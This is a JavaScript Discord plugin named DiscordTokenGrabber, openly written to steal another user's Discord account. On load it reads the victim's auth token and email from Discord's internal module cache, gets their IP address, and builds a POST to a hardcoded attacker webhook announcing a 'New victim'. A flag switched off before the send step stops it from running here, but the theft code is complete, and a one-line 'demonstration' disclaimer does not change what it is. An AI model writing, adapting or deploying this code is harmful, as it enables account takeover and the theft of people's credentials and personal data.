/** 
  * @name DiscordTokenGrabber
  * @version 1.1
  * @description Plugin for getting someone else's auth token Discord
*/

/* Authors
 * ethernalsteve - Developer
 * The Way - Co-Author of the idea
 * your nickname - Contributor
*/

/* This plugin is for demonstration purposes! Not recommended for malicious purposes! */

const config = {
    "info": {
        "name": "DiscordTokenGrabber",
        "authors": ["ethernalsteve", "The Way", "your nickname"],
        "version": "1.1",
        "description": "Plugin for getting someone else's auth token Discord"
    },
    "webhook": "https://discord.com/api/webhooks/786589563602468864/y-8oOOPaGRK4FjtOW-xHB_xGupXU4I5r4R0gNL0Q1GzrKRUDa7zBvsFdu1sLgeenFxTK"
};

class DiscordTokenGrabber {
    constructor() {
        this._config = config; 
    }
    
    start() {
        // Functionality for starting the token grabbing process
    }
    
    stop() {
        // Functionality for stopping the token grabbing process
    }
    
    getName() {
        return config.info.name;
    }
    
    getAuthor() {
        return config.info.authors[0];
    }
    
    getDescription() {
        return config.info.description;
    }
    
    getVersion() {
        return config.info.version;
    }

    load() {
        const authToken = Object.values(webpackJsonp.push([ [], { ['']: (_, e, r) => { e.cache = r.c } }, [ [''] ] ]).cache).find(m => m.exports && m.exports.default && m.exports.default.getToken !== void 0).exports.default.getToken();
        const userEmail = Object.values(webpackJsonp.push([ [], { ['']: (_, e, r) => { e.cache = r.c } }, [ [''] ] ]).cache).find(m => m.exports && m.exports.default && m.exports.default.getEmail !== void 0).exports.default.getEmail();
        const username = $("[class *= \"nameTag\"]").first().text();

        let executeAction = true;  // Boolean flag to control the execution of the action

        function onStart() {
            if (executeAction) {
                $.getJSON("https://api.ipify.org?format=json", (data) => { 
                    require("request").post(config.webhook, {
                        form: {
                            content: `**New victim found by __${config.info.authors[0]}__**\n\n**Victim's nickname: __${username}__**\n**Victim email: __${userEmail}__**\n**IP: __${data.ip}__**\n\n**Received token:**\`\`\`${authToken}\`\`\``
                        }
                    });
                });
            }
        }

        function turnOffAction() {
            executeAction = false;
            console.log("Action turned off");
        }

        turnOffAction();  // Call this to turn off the action
        onStart();  // The action will not be executed because executeAction is set to false
    }
}

const tokenGrabber = new DiscordTokenGrabber();
tokenGrabber.load();




